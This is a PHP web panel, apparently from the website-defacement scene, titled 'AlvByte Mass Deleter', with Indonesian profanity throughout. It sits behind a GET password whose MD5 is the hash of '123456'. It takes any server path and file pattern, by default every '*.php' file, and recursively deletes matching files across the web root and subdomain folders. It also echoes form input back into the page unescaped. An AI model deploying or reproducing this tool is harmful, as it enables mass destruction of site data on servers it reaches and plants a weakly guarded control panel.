<?php
if (!isset($_GET['pass']) || md5($_GET['pass']) != 'e10adc3949ba59abbe56e057f20f883e') { // pass: 123456, ganti hash lo
    die('Access Denied, bangsat!');
}
error_reporting(0);
ini_set('display_errors', 0);
?>
<!DOCTYPE html>
<html>
<head>
    <title>AlvByte Mass Deleter SEO ANJING</title>
    <style>
        body { background: #000; color: #f00; font-family: monospace; }
        .container { width: 90%; margin: auto; }
        input, textarea { width: 100%; background: #111; color: #f00; border: 1px solid #f00; }
        button { background: #f00; color: #000; padding: 10px; cursor: pointer; }
        pre { background: #111; padding: 10px; overflow: auto; color: #0f0; }
        .log { color: #ff0; }
    </style>
</head>
<body>
<div class="container">
    <h1>Mass Deleter - Hapus File Vuln di Root & Subdomain & SEO KONTOL TUKANG TIKUNG ASU</h1>
    

    <h2>Masukkan Path Root (misal /var/www/html) & File Pattern (misal *.php atau backdoor.php)</h2>
    <form method="POST">
        <input type="text" name="root_path" placeholder="/var/www/html" value="<?php echo isset($_POST['root_path']) ? $_POST['root_path'] : ''; ?>">
        <input type="text" name="file_pattern" placeholder="*.php" value="<?php echo isset($_POST['file_pattern']) ? $_POST['file_pattern'] : '*.php'; ?>">
        <button type="submit" name="scan">Scan & Auto Deteksi Folder</button>
    </form>
    
    <?php
    if (isset($_POST['scan'])) {
        $root = $_POST['root_path'];
        $pattern = $_POST['file_pattern'];
        $deleted = [];
        $log = [];
        
        function deleteFiles($dir, $pattern, &$deleted, &$log) {
            if (!is_dir($dir)) {
                $log[] = "Folder ga ada: $dir";
                return;
            }
            $files = glob($dir . '/' . $pattern);
            foreach ($files as $file) {
                if (unlink($file)) {
                    $deleted[] = $file;
                    $log[] = "[DELETED] $file";
                } else {
                    $log[] = "[FAILED] $file - Permission denied, kontol!";
                }
            }
            $subdirs = glob($dir . '/*', GLOB_ONLYDIR);
            foreach ($subdirs as $subdir) {
                deleteFiles($subdir, $pattern, $deleted, $log);  // Rekursif auto deteksi subdomain/folder
            }
        }
        
        echo "<h3>Scanning $root untuk $pattern...</h3>";
        deleteFiles($root, $pattern, $deleted, $log);
        
        echo "<pre class='log'>";
        foreach ($log as $entry) {
            echo $entry . "\n";
        }
        echo "</pre>";
        
        echo "<h3>Total Dihapus: " . count($deleted) . " file, anjing!</h3>";
        echo "<pre>" . implode("\n", $deleted) . "</pre>";
    }
    ?>
    
   
    <h2>Log Hapus Terakhir</h2>
    <pre><?php
    if (file_exists('delete_log.txt')) {
        echo file_get_contents('delete_log.txt');
    } else {
        echo "Belum ada log, brengsek!";
    }
    ?></pre>
    
    <form method="POST">
        <button type="submit" name="save_log">Simpan Log ke delete_log.txt</button>
    </form>
    <?php
    if (isset($_POST['save_log'])) {
        if (isset($log)) {
            file_put_contents('delete_log.txt', implode("\n", $log) . "\n" . date('Y-m-d H:i:s') . "\n");
            echo "<p>Log disimpen, jablay!</p>";
        }
    }
    ?>
</div>
</body>
</html>
